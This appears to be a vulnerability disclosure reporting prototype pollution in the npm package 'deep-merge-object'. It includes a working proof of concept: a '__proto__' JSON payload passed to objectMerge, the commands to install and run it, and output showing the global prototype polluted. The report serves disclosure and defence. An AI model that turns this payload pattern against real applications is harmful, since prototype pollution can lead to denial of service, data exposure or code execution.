# Description

`deep-merge-object` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var {objectMerge } = require("deep-merge-object")
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
objectMerge(obj, payload);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i deep-merge-object # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
